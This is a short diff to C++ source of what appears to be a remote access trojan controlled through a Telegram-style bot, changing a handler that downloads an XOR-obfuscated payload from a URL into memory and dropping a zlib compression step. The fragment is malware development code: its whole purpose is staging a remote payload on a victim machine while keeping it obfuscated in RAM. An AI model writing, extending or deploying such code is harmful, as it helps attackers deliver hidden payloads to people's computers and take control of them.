@@ -99,19 +99,12 @@ void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
 		                  file_url);
 
 		HANDLER_DEBUG_LOG("XOR key :{}", this->state.payload_key);
-		auto result =
-		    downloadXoredPayload(&this->bot->curl_client, this->state.payload,
-		                         file_url, &this->state.payload_key);
+		auto result = downloadXoredPayload(file_url);
 
 		this->state.payload_uncompressed_size = result.size;
 		HANDLER_DEBUG_LOG("File downloaded with uncompressed size {} ",
 		                  this->state.payload_uncompressed_size);
 	}
-
-	constexpr uint8_t zlib_compression_level = 5;
-
-	::rat::compression::zlibCompressVector(this->state.payload,
-	                                       zlib_compression_level);
 
 	HANDLER_DEBUG_LOG("Succeeded at downloading the payload into RAM "
 	                  "obfuscated, Number of Bytes from {} to {}",
